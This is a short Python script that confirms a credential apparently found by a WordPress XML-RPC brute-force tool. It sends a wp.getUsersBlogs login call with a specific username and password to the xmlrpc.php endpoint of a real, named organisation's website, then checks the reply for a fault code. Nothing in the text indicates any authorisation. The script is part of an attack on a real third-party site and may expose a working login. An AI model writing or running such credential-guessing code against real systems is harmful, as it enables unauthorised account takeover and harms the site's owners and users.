"""Verify a claimed xmlrpc hit with a plain single call."""
import sys

sys.path.insert(0, ".")
import scan  # noqa: E402
import xmlrpc_bf as x  # noqa: E402

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

payload = (b'<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName>'
           b'<params><param><value><string>emutemi</string></value></param>'
           b'<param><value><string>kenneth</string></value></param></params></methodCall>')
req = __import__("urllib.request", fromlist=["x"]).Request(
    "https://www.nimr.or.tz/xmlrpc.php", data=payload,
    headers={"User-Agent": scan.UA, "Content-Type": "text/xml"})
with __import__("urllib.request", fromlist=["x"]).urlopen(
        req, timeout=25, context=scan.CTX) as r:
    body = r.read(4000).decode("utf-8", "replace")
print("status", r.status, "faultCode" in body)
print(body[:600])
